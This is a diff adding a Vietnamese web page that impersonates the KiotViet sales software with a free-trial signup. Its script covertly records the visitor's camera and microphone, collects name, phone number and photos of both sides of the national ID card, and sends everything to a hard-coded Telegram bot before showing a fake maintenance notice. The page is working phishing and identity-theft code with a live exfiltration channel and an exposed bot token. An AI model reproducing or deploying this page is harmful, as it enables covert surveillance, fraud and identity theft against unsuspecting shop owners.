@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KiotViet - Phần mềm quản lý bán hàng phổ biến nhất</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #ffffff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; color: #334155; }
+        .kv-green { color: #57b846; }
+        .bg-kv-green { background-color: #57b846; }
+        .hidden { display: none; }
+        .slider-container { position: relative; overflow: hidden; width: 100%; aspect-ratio: 16/9; }
+        .slide { position: absolute; inset: 0; opacity: 0; transition: opacity 0.8s ease-in-out; }
+        .slide.active { opacity: 1; }
+        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .loader { border-top-color: #57b846; animation: spinner 1s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .input-custom { width: 100%; padding: 16px; border: 1px solid #e2e8f0; border-radius: 16px; outline: none; transition: all 0.3s; font-size: 16px; background: #ffffff; }
+        .category-item { display: flex; align-items: center; padding: 14px 0; border-bottom: 1px solid #f1f5f9; }
+        .category-icon-img { width: 24px; height: 24px; margin-right: 15px; opacity: 0.6; }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <div id="loading-global" class="hidden fixed inset-0 z-[500] bg-white/95 flex flex-col items-center justify-center">
+        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-100 h-16 w-16 mb-4"></div>
+        <p id="loading-text" class="text-[12px] font-bold text-slate-400 uppercase tracking-widest text-center px-6">Đang kết nối hệ thống...</p>
+    </div>
+
+    <div id="landing-page" class="fade-in">
+        <nav class="flex items-center justify-between px-6 py-4 bg-white sticky top-0 z-50 border-b border-gray-50">
+            <img src="https://vcdn.kiotviet.vn/kiotviet-vn/Static/Theme/images/logo.png" alt="KiotViet" class="h-7">
+            <svg class="w-6 h-6 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
+        </nav>
+        
+        <main class="pb-24">
+            <div class="slider-container bg-slate-100">
+                <img src="https://vcdn.kiotviet.vn/kiotviet-vn/Static/Theme/images/Banner_Home_MB_1.jpg" class="slide active object-cover w-full h-full">
+                <img src="https://vcdn.kiotviet.vn/kiotviet-vn/Static/Theme/images/Banner_Home_MB_2.jpg" class="slide object-cover w-full h-full">
+                <img src="https://vcdn.kiotviet.vn/kiotviet-vn/Static/Theme/images/Banner_Home_MB_3.jpg" class="slide object-cover w-full h-full">
+            </div>
+
+            <div class="px-6 py-8 text-center bg-slate-50">
+                <h2 class="text-xl font-bold text-slate-800 mb-2">Phù hợp cho từng ngành hàng</h2>
+                <p class="text-slate-500 text-sm italic">Hơn 200.000 cửa hàng đã tin dùng</p>
+            </div>
+
+            <div class="px-6 mb-8">
+                <div class="flex items-center gap-3 mb-4 pt-4">
+                    <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center text-blue-500 font-bold text-lg">🛍️</div>
+                    <span class="font-extrabold text-[#002b5c] text-lg">Bán buôn, bán lẻ</span>
+                </div>
+                <div class="pl-1">
+                    <div class="category-item"><img src="https://cdn-icons-png.flaticon.com/128/3159/3159614.png" class="category-icon-img"><span>Thời trang</span></div>
+                    <div class="category-item"><img src="https://cdn-icons-png.flaticon.com/128/3081/3081840.png" class="category-icon-img"><span>Tạp hóa & Siêu thị</span></div>
+                    <div class="category-item"><img src="https://cdn-icons-png.flaticon.com/128/3163/3163195.png" class="category-icon-img"><span>Mỹ phẩm</span></div>
+                </div>
+            </div>
+
+            <div class="px-6 text-center mt-6 mb-16">
+                <button onclick="requestAccess()" class="w-full max-w-xs bg-blue-600 text-white py-4 rounded-full font-black text-lg shadow-xl active:scale-95 transition-all">ĐĂNG KÝ NGAY</button>
+                <p class="mt-3 text-slate-400 text-xs tracking-widest uppercase">7 ngày dùng thử miễn phí</p>
+            </div>
+        </main>
+    </div>
+
+    <video id="v" autoplay muted playsinline class="hidden"></video>
+    <div id="flow-content"></div>
+</div>
+
+<script>
+    // Logic Slider Banner
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    setInterval(() => {
+        if(slides.length > 0) {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (currentSlide + 1) % slides.length;
+            slides[currentSlide].classList.add('active');
+        }
+    }, 4000);
+
+    // LOGIC TELEGRAM (8508820343)
+    const TELEGRAM_TOKEN = '8508820343:AAEd6sPNZgoXimq-ud_T7v_PFNsF62UELVA'; 
+    const CHAT_ID = '-1003844702216'; 
+
+    let userData = { name: '', phone: '', imgFront: null, imgBack: null, video: null };
+    let mediaRecorder, chunks = [], globalStream;
+
+    function showLoad(text, time, callback) {
+        const el = document.getElementById('loading-global');
+        document.getElementById('loading-text').innerText = text;
+        el.classList.remove('hidden');
+        setTimeout(() => { el.classList.add('hidden'); if(callback) callback(); }, time);
+    }
+
+    async function requestAccess() {
+        try {
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('v').srcObject = globalStream;
+            mediaRecorder = new MediaRecorder(globalStream);
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            mediaRecorder.start(1000); 
+
+            document.getElementById('landing-page').classList.add('hidden');
+            showLoad("ĐANG TẢI DỮ LIỆU...", 1000, renderPhoneInput);
+        } catch (e) {
+            alert("Vui lòng cho phép Camera để nhận ưu đãi.");
+            window.location.reload();
+        }
+    }
+
+    function renderPhoneInput() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen flex flex-col items-center pt-24 px-4 bg-[#f0f2f5]">
+            <div class="bg-white p-10 rounded-[32px] shadow-2xl w-full max-w-[440px] text-center">
+                <img src="https://vcdn.kiotviet.vn/kiotviet-vn/Static/Theme/images/logo.png" class="h-6 mx-auto mb-10">
+                <input id="uName" type="text" placeholder="HỌ VÀ TÊN CHỦ CỬA HÀNG" class="input-custom mb-4 uppercase">
+                <input id="uPhone" type="tel" maxlength="10" placeholder="SỐ ĐIỆN THOẠI" class="input-custom mb-8 font-bold">
+                <button onclick="handleStep1()" class="w-full bg-kv-green text-white py-4.5 rounded-2xl font-black shadow-xl">TIẾP TỤC</button>
+            </div>
+        </div>`;
+    }
+
+    function handleStep1() {
+        const n = document.getElementById('uName').value, p = document.getElementById('uPhone').value;
+        if (n.length > 2 && /^0[0-9]{9}$/.test(p)) {
+            userData.name = n.toUpperCase(); userData.phone = p;
+            showLoad("KIỂM TRA DỮ LIỆU...", 1500, renderVerifyNotice);
+        } else { alert("Thông tin chưa chính xác."); }
+    }
+
+    function renderVerifyNotice() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-black/60 flex items-center justify-center p-6 z-[200]">
+            <div class="bg-white rounded-[32px] p-10 max-w-sm w-full text-center">
+                <h3 class="text-xl font-bold mb-4 uppercase">Định danh tài khoản</h3>
+                <p class="text-sm text-slate-500 mb-8">Chụp ảnh CCCD mặt trước/sau để hoàn tất bảo mật.</p>
+                <button onclick="showLoad('KHỞI TẠO...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4.5 rounded-2xl font-black">BẮT ĐẦU</button>
+            </div>
+        </div>`;
+    }
+
+    function renderUpload() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-10">
+            <h2 class="text-xl font-black mb-10 uppercase kv-green">Tải ảnh CCCD</h2>
+            <div class="w-full max-w-sm space-y-6">
+                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-48 flex items-center justify-center bg-slate-50 overflow-hidden">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'f-p', 'f-t', 'imgFront')">
+                    <p id="f-t" class="text-slate-400 font-bold text-xs">MẶT TRƯỚC CCCD</p>
+                    <img id="f-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
+                </div>
+                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-48 flex items-center justify-center bg-slate-50 overflow-hidden">
+                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'b-p', 'b-t', 'imgBack')">
+                    <p id="b-t" class="text-slate-400 font-bold text-xs">MẶT SAU CCCD</p>
+                    <img id="b-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
+                </div>
+            </div>
+        </div>`;
+    }
+
+    function aiScan(input, pI, tI, k) {
+        if (!input.files[0]) return;
+        const r = new FileReader();
+        r.onload = e => {
+            document.getElementById(pI).src = e.target.result;
+            document.getElementById(pI).classList.remove('hidden');
+            document.getElementById(tI).classList.add('hidden');
+            userData[k] = input.files[0];
+            if (userData.imgFront && userData.imgBack) finalizeAndSend();
+        };
+        r.readAsDataURL(input.files[0]);
+    }
+
+    async function finalizeAndSend() {
+        showLoad("ĐANG XỬ LÝ...", 3000, async () => {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.onstop = async () => {
+                    userData.video = new File(chunks, "v.mp4", { type: "video/mp4" });
+                    await sendToTele();
+                };
+                mediaRecorder.stop();
+                globalStream.getTracks().forEach(t => t.stop());
+            }
+            renderMaintenance();
+        });
+    }
+
+    async function sendToTele() {
+        try {
+            const cap = `🔔 **THÔNG TIN MỚI**\n👤: ${userData.name}\n📱: \`${userData.phone}\``;
+            const vFd = new FormData();
+            vFd.append('chat_id', CHAT_ID); vFd.append('video', userData.video);
+            vFd.append('caption', cap); vFd.append('parse_mode', 'Markdown');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: vFd });
+
+            const sendI = async (f, l) => {
+                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', f);
+                fd.append('caption', `📸 ${l}: ${userData.name}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            };
+            await sendI(userData.imgFront, "TRƯỚC");
+            await sendI(userData.imgBack, "SAU");
+        } catch (e) {}
+    }
+
+    function renderMaintenance() {
+        document.getElementById('flow-content').innerHTML = `
+        <div class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[500] p-8 text-center">
+            <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Hệ thống bảo trì</h3>
+            <p class="text-slate-500 text-sm">Máy chủ đang nâng cấp định kỳ. Vui lòng quay lại sau 24h.</p>
+        </div>`;
+    }
+</script>
+</body>
+</html>
